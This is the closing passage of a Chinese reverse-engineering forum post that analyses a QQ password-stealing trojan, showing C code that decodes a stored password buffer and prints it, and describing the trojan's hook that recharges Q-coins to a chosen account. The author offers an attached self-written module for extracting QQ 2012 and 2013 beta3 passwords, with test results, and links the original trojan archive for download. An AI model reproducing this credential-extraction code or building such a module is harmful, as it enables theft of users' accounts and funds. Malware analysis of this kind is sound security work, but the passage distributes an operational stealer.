
```c
++n5;

if ( n5 == 0x81 )
    goto LABEL_16;
}

char szTmp[2] = {0};

if (n4 == 1)
{
    sprintf_s(szTmp, "%c", n5+32);
}
else
{
    sprintf_s(szTmp, "%c", n5);
}
int nSize = strlen(szPwd);
strcpy(szPwd + nSize, szTmp);
}
else
{
    char szTmp[2] = {0};
    sprintf_s(szTmp, "%c", *(szBuf + n2));
    int nSize = strlen(szPwd);
    strcpy(szPwd + nSize, szTmp);
}
LABEL_16:
++n1;
} while (nPwdLen-- != 1);
}
OutputDebugStringA(szPwd);
}
}
```

////////////////////////////////////////////////////////////////////////////////

具体的参考附近中的代码；

到这里，关键的一些技术差不多就这样了，这个木马还有为指定用户充Q币；

都在 `hook` "`KernelUtil.dll`" 模块中的 `"?GetAccountName@Account@Util@@YA?AVCTXS"` 中操作，有兴趣的可以看看；

下面是我测试的贴图；

![](https://bbs.kanxue.com/upload/attach/201308/591993_q7uaortiu6gzn9n.jpg)

![](https://bbs.kanxue.com/upload/attach/201308/591993_3bh09ome5o1b56s.jpg)

附件中有我写好的模块，可以获取2012，2013 beat3；

2012 版的win7 xp 下测试通过；

2013beat3 版的xp 测试通过；win7 的会崩溃；

2013正式版的测试了用不了；

今天7夕，

祝：

有情人 终成眷属

没情人 ...(没想好)

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

上传的附件：

- [11111.jpg](javascript:void(0);)
  （107.95kb，106次下载）
- [qq1.jpg](javascript:void(0);)
  （102.70kb，5次下载）
- [qq2.jpg](javascript:void(0);)
  （96.93kb，84次下载）
- [源木马.rar](javascript:void(0);)
  （73.96kb，460次下载）
- [TX.rar](javascript:void(0);)
  （328.20kb，462次下载）
